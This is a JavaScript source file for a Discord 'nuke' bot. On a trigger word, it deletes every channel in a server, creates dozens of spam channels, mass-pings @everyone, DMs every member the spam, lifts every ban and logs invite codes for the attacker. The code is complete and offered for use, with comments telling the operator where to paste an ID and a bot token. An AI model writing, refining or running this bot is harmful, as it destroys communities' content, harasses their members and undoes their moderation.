const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

// ===== VARIABLES =====

// ===== BOT VARS =====
// paste your discord user id here
const your_id = "940285651172081685";
// start code
const code = "start";
// stop code
const stopcode = "stop";
// cleanup code
const cleancode = "cleanup";
// if we're nuking or not
let activated = false;
// what to spam (change the text within the speech marks if you want the bot to spam something different)
let text = `@everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps @everyone this server got nuked by the Anti Dream Extermination Corps `;

// ===== MASS UNBAN =====
// enable mass unbanning
let mass_unban = true;

// ===== DM SPAM =====
// enable DM spam
let dmspam_enabled = true;
// what to spam in dms
let dms = text; // (same as normal spam)

// ===== SERVER STUFF =====
// how many channels to make
const howmany = 45;
// what to name nuke channels
const Cname = "oopsies";
// what to name the cleanup channel
const cleanname = "nothing happened";
// what to give each channel's topic
const Ctopic = "Have fun fixing the server ;)";

// when the bot logs in
client.on('ready', () => {
	try {
		// guild logging
		client.guilds.cache.forEach(guild => {
			// log the guild's name
			console.log(`Logged Guild: ${guild.name}`);
			// pick a random channel
			var chx = guild.channels.cache.filter(chx => chx.type === "GUILD_TEXT").find(x => x.position === 0);
			// lets get an invite to the server
			chx.createInvite(
				{
					maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
					maxUses: 100 // maximum times it can be used
				},
				`LOG`
			).then(e => {
				// log it
				console.log(`Logged invite code to ${guild.name} - ${e.code}`);
			}).catch(console.log);
		})
	} catch (e) {
		console.log(`Error with logging invites, ${e}`)
	}
	// successful login
  	console.log(`Logged in as ${client.user.tag}!`);
});

// function to clear all server channels
let clear = (message) => {
	message.guild.channels.cache.forEach(channel => channel.delete().catch(e => console.log("Tried deleting community channel")));
}

// make a server channel
let makeChannel = (message, name) => {
	message.guild.channels.create(name, {
        type: "text",
		topic: Ctopic,
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone, 
             allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Allow permissions
		   }
        ],
    }).then(channel => {
		// a workaround to jumpstart spamming
		if (name != cleanname) {
			channel.send(text).catch(e => {
				console.log("Error trying to jumpstart spamming")
			})
		} else {
			channel.send("Oops...")
		}
	}).catch(e => console.log("Error making channels."));
}

// dm everyone in the server
let dmeveryone = (message, toDM) => {
	// is dm spam enabled?
	if (dmspam_enabled == true) {
		message.guild.members.cache.forEach(membersfetch => {
			membersfetch.send(toDM).catch(e => console.log(`DM error, user: ${membersfetch.user.tag}`))
		})
	}
}

let logInvite = async (message) => {
	// lets get an invite to the server
	let invite = await message.channel.createInvite(
		{
			maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
			maxUses: 100 // maximum times it can be used
		},
		`LOG`
	).catch(e => {
		console.log("Error logging an invite.");
	});

	console.log(`INVITE CODE: ${invite.code}`);
}

let massUnban = (message) => {
	let howMany = 0;
	if (mass_unban == true) {
		message.guild.bans.fetch().then(fB => {
			
			fB.forEach(fB=>{
		    	message.guild.members.unban(fB.user.id);
				howMany++;
			})

			console.log(`Successfully mass unbanned ${howMany} people.`)
			
	    }).catch(e => {
			console.log(e);
		});
	}
}

client.on('messageCreate', message => {

	// switch to the message content
	switch(message.content) {

		// start nuking
		case code:
			console.log(`===== NUKE STARTED =====`)
			// we start nuking 
			activated = true;
			// log an invite ;)
			logInvite(message);
			// mass unban
			massUnban(message);
			// clear all the server channels
			clear(message)
			// make server channels
			for (let i=0; i<howmany; i++) {
				makeChannel(message, Cname)
			}
			break;

		// leave the server
		case "leave":
			if (message.content == "leave") {
				// check if its the owners id
				if (message.author.id == your_id) {
					try {
						message.channel.send("Goodbye all");
						console.log(`Left guild ${message.channel.guild.name}`);
						message.channel.guild.leave();
					} catch (e) {
						console.log("Error leaving");
					}
				}
			}
			break;

		// stop the spam (quite delayed)
		case stopcode:
			activated = false;
			break;

		// clean server
		case cleancode:
			activated = false;
			// clear all server channels
			clear(message)
			makeChannel(message, cleanname)
			break;
	}

	// react to the bot's spam and reply to it with more spam
	if (activated == true) {

		// try catch for if the channel is a catergory/voice channel
		try {
			
			message.guild.channels.cache.forEach(channel => {
				// send the message
				channel.send(text).catch(e => {
					console.log("Error spamming")
				})
			}).catch(e => {
				console.log("Error looping through guild channels");
			});

			dmeveryone(message, dms);
			
		} catch (e) {
			console.log("Error trying to spam/dm everyone")
		}
		
	}

});

// login
// put your token here
client.login(process.env['TOKEN']);
